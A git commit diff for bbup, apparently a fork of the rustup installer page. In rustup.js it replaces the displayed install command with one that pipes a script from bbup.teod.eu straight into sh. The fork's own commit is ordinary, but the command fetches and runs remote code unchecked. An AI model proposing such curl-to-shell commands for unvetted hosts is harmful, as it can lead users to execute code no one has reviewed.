7867b10f1b14de0a139076abeb66fce36859a944
Teodor Heggelund <git@teod.eu>
2023-02-03 18:30:36 +0100

    Fix: actual pasted command was from rust

--- bbup_files/rustup.js
+++ bbup_files/rustup.js
@@ -2,7 +2,7 @@
 
 var platforms = ["default", "unknown", "unix"];
 var platform_override = null;
-var rustup_install_command = "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh";
+var rustup_install_command = "curl --proto '=https' --tlsv1.2 -sSf https://bbup.teod.eu/install.sh | sh";
 
 function detect_platform() {
     "use strict";
